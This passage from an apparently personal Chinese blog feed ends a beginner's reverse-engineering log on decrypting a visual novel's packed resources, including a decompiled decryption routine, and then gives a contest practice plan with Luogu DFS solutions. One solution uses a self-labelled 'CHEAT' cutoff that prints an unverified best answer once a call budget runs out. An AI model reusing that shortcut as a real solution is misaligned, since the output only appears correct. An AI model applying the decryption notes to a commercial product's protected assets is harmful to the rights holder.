)</code><br>然后一大堆简洁调用函数<br>接着check如果size满足条件 <code>if ( v17 &lt;= 0x20000000 )</code> …</p><p>结合x32dbg动调分析<br>可以知道先建了一个表 然后循环(采用的是goto)来解密<br>但并没有找到教程虽说的解密后的数据…<br>翻内存倒是翻到有jpeg字段 应该是解密了部分资源出来了<br>跳出这个函数继续往后分析</p><p>跳出这个函数来到这里<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-70.png" alt="img"></p><p>sub_487680-&gt;decrypt3_hash</p><p>跟踪到这里面<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-71.png" alt="img"><br>发现已经解出文件名了<br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-72.png" alt="img"></p><p>decrypt3在IDA交叉引用很容易找到 就是 <code>sub_4878D4</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">decrypt3</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  __m64 *v7; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// esi</span></span><br><span class="line">  __m64 v9; <span class="comment">// mm7</span></span><br><span class="line">  __m64 v10; <span class="comment">// mm7</span></span><br><span class="line">  __m64 v11; <span class="comment">// mm1</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp-4h] [ebp-CCh]</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">164</span>]; <span class="comment">// [esp+Ch] [ebp-BCh] BYREF</span></span><br><span class="line">  __m64 v14; <span class="comment">// [esp+B0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> *v15; <span class="comment">// [esp+B8h] [ebp-10h]</span></span><br><span class="line">  __m64 *v16; <span class="comment">// [esp+BCh] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp+C0h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp+C4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1 - <span class="number">8</span>;</span><br><span class="line">  <span class="built_in">decrypt3_hash</span>(a1);</span><br><span class="line">  v2 = <span class="number">41</span>;</span><br><span class="line">  v3 = v13;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v3 = <span class="built_in">sub_4872C0</span>(*(_DWORD *)(*(_DWORD *)v1 + <span class="number">0x164</span>));</span><br><span class="line">    v3 += <span class="number">4</span>;</span><br><span class="line">    --v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 );</span><br><span class="line">  v14.m64_i32[<span class="number">0</span>] = <span class="built_in">sub_4872C0</span>(*(_DWORD *)(*(_DWORD *)v1 + <span class="number">356</span>));</span><br><span class="line">  v14.m64_i32[<span class="number">1</span>] = <span class="built_in">sub_4872C0</span>(*(_DWORD *)(*(_DWORD *)v1 + <span class="number">356</span>));</span><br><span class="line">  result = *(_DWORD *)(a1 - <span class="number">4</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  v18 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = *(__m64 **)(a1 - <span class="number">12</span>);</span><br><span class="line">    v15 = v13;</span><br><span class="line">    v17 = <span class="number">8</span> * (<span class="built_in">sub_4872C0</span>(*(_DWORD *)(*(_DWORD *)v1 + <span class="number">356</span>)) &amp; <span class="number">0xF</span>);</span><br><span class="line">    v12 = v17;</span><br><span class="line">    v5 = v18;</span><br><span class="line">    v6 = v17;</span><br><span class="line">    v7 = v16;</span><br><span class="line">    v8 = (<span class="type">int</span>)v15;</span><br><span class="line">    v9 = v14;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = _m_paddd(_m_pxor(v9, *(__m64 *)(v6 + v8)), *(__m64 *)(v6 + v8));</span><br><span class="line">      v11 = _m_pxor((__m64)v7-&gt;m64_u64, v10);</span><br><span class="line">      v7-&gt;m64_u64 = (<span class="type">unsigned</span> __int64)v11;</span><br><span class="line">      v9 = _m_paddw(_m_pslldi(_m_pxor(_m_paddb(v10, v11), v11), <span class="number">1u</span>), v11);</span><br><span class="line">      ++v7;</span><br><span class="line">      v6 = ((_BYTE)v6 + <span class="number">8</span>) &amp; <span class="number">0x7F</span>;</span><br><span class="line">      --v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 );</span><br><span class="line">    _m_empty();</span><br><span class="line">    result = v12;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但跟教程的汇编好多对不上… gg</p><p>近月2到这里就结束了… 但是还有好多地方没有理清楚</p><p>— 太难了 —</p><p>但还是得继续… 想了想 也只能用x32dbg&#x2F;olldbg  IDA一不好输出日志 二不好返回用户领空<br>慢慢磨吧…</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>lqb OI | Practice Plan</title>
      <link href="/lqb-OI-Practice-Plan/"/>
      <url>/lqb-OI-Practice-Plan/</url>
      
        <content type="html"><![CDATA[<h1 id="整体训练思路"><a href="#整体训练思路" class="headerlink" title="整体训练思路:"></a>整体训练思路:</h1><p>以luogu的题为主<br>搜索是重点 然后是数据结构部分 把网络流之前的板子背下来   dp推不来算求了…</p><p>搜索<br>图论<br>STL<br>贪心&#x2F;分治<br>DP<br>线段树&#x2F;平衡树(pbds)</p><p>[[toc]]</p><h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><h2 id="P1189-SEARCH"><a href="#P1189-SEARCH" class="headerlink" title="P1189 SEARCH"></a>P1189 SEARCH</h2><p>有意思的一个记忆化搜索 注意到经常会走到同样的状态<br>(x,y) and face z<br>数据范围很小 可以开数组存状态 <code>vis[x][y][z]</code><br>然后就写一个基本的dfs 注意下边界条件 以及return的点<br>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> R,C,n;</span><br><span class="line"><span class="type">char</span> a[<span class="number">55</span>][<span class="number">55</span>];<span class="built_in">string</span> fx[<span class="number">1005</span>];</span><br><span class="line"><span class="type">int</span> vis[<span class="number">55</span>][<span class="number">55</span>][<span class="number">1005</span>]; <span class="comment">// record (x,y) and fx[z]</span></span><br><span class="line"><span class="type">int</span> sx,sy; <span class="comment">// start point</span></span><br><span class="line"><span class="type">char</span> ans[<span class="number">55</span>][<span class="number">55</span>];</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ISDEBUG 0</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> z)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(a[x][y]==<span class="string">&#x27;X&#x27;</span>)<span class="keyword">return</span> ;</span><br><span class="line"><span class="keyword">if</span>(x&lt;<span class="number">0</span>||y&lt;<span class="number">0</span>||x&gt;R||y&gt;C)<span class="keyword">return</span> ;</span><br><span class="line"><span class="keyword">if</span>(vis[x][y][z]) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(z==n+<span class="number">1</span>)&#123;</span><br><span class="line">ans[x][y]=<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(ISDEBUG)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;(&quot;</span>&lt;&lt;x&lt;&lt;<span class="string">&quot;,&quot;</span>&lt;&lt;y&lt;&lt;<span class="string">&quot;) &quot;</span>&lt;&lt;z&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> l=<span class="number">0</span>;</span><br><span class="line">vis[x][y][z]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(fx[z]==<span class="string">&quot;NORTH&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=x<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i][y]==<span class="string">&#x27;X&#x27;</span>)<span class="keyword">break</span>;</span><br><span class="line">dfs(i,y,z+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(fx[z]==<span class="string">&quot;SOUTH&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=x+<span class="number">1</span>;i&lt;=R;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i][y]==<span class="string">&#x27;X&#x27;</span>)<span class="keyword">break</span>;</span><br><span class="line">dfs(i,y,z+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(fx[z]==<span class="string">&quot;WEST&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=y<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[x][i]==<span class="string">&#x27;X&#x27;</span>)<span class="keyword">break</span>;</span><br><span class="line">dfs(x,i,z+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(fx[z]==<span class="string">&quot;EAST&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=y+<span class="number">1</span>;i&lt;=C;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[x][i]==<span class="string">&#x27;X&#x27;</span>)<span class="keyword">break</span>;</span><br><span class="line">dfs(x,i,z+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;R&gt;&gt;C;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=R;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=C;j++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i][j];</span><br><span class="line">ans[i][j]=a[i][j];</span><br><span class="line"><span class="keyword">if</span>(a[i][j]==<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">sx=i,sy=j,ans[i][j]=<span class="string">&#x27;.&#x27;</span>,a[i][j]=<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)<span class="built_in">cin</span>&gt;&gt;fx[i];</span><br><span class="line">dfs(sx,sy,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=R;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=C;j++)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ans[i][j];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="P1278-单词游戏"><a href="#P1278-单词游戏" class="headerlink" title="P1278 单词游戏"></a>P1278 单词游戏</h2><p>最暴力的剪枝233<br>超过时限次数就直接output…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">string</span> a[<span class="number">17</span>];</span><br><span class="line"><span class="type">int</span> n;<span class="type">int</span> vis[<span class="number">17</span>];<span class="type">int</span> l[<span class="number">17</span>];</span><br><span class="line"><span class="type">int</span> _time=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> maxx=<span class="number">-1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHEAT 1</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span> ed,<span class="type">int</span> len)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(CHEAT)&#123;</span><br><span class="line">_time++;</span><br><span class="line"><span class="keyword">if</span>(_time&gt;<span class="number">1e7</span>)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;maxx&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">maxx=max(maxx,len);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>((!vis[i])&amp;&amp;(a[i][<span class="number">0</span>]==ed))&#123;</span><br><span class="line">vis[i]=<span class="number">1</span>;</span><br><span class="line">dfs(a[i][l[i]<span class="number">-1</span>],len+l[i]);</span><br><span class="line">vis[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">l[i]=a[i].length();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">vis[i]=<span class="number">1</span>;</span><br><span class="line">dfs(a[i][l[i]<span class="number">-1</span>],l[i]);</span><br><span class="line">vis[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;maxx&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="P1406-方格填数"><a href="#P1406-方格填数" class="headerlink" title="P1406 方格填数"></a>P1406 方格填数</h2><p>n&#x3D;4的时候加一些可行性剪枝 比如<code>x==n</code>和<code>y==n</code>可以剪一剪 对角线可以剪一剪<br>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG 0</span></span><br><span class="line"><span class="type">int</span> n,a[<span class="number">17</span>],tot=<span class="number">0</span>,s,vis[<span class="number">17</span>],ans[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y==n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=x;i++)&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)sum+=ans[i][j];</span><br><span class="line"><span class="keyword">if</span>(sum!=s)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x==n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=y;i++)&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)sum+=ans[j][i];</span><br><span class="line"><span class="keyword">if</span>(sum!=s)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(y==n)&#123;</span><br><span class="line"><span class="keyword">if</span>(x&gt;=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)sum+=ans[i][n+<span class="number">1</span>-i];</span><br><span class="line"><span class="keyword">if</span>(sum!=s)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x==n)&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)sum+=ans[i][i];</span><br><span class="line"><span class="keyword">if</span>(sum!=s)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">check2</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y==n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=x<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)sum+=ans[i][j];</span><br><span class="line"><span class="keyword">if</span>(sum!=s)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x==n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=y<span class="number">-1</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)sum+=ans[j][i];</span><br><span class="line"><span class="keyword">if</span>(sum!=s)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x==n&amp;&amp;y&gt;<span class="number">1</span>)&#123;</span><br><span class="line"><span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)sum+=ans[i][n+<span class="number">1</span>-i];</span><br><span class="line"><span class="keyword">if</span>(sum!=s)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(DEBUG)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;x&lt;&lt;<span class="string">&quot;   &quot;</span>&lt;&lt;y&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!check2(x,y))<span class="keyword">return</span> ;</span><br><span class="line"><span class="keyword">if</span>(x==n+<span class="number">1</span>&amp;&amp;y==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!check(n,n))&#123;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;ans[i][j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n*n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!vis[i])&#123;</span><br><span class="line">vis[i]=<span class="number">1</span>;</span><br><span class="line">ans[x][y]=a[i];</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(y==n)dfs(x+<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">else</span> dfs(x,y+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">ans[x][y]=<span class="number">0</span>;</span><br><span class="line">vis[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">cmp</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> x&lt;y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">signed</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n*n;i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">tot+=a[i];</span><br><span class="line">&#125;</span><br><span class="line">s=tot/n;</span><br><span class="line">sort(a+<span class="number">1</span>,a+n*n+<span class="number">1</span>,cmp);</span><br><span class="line">dfs(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> 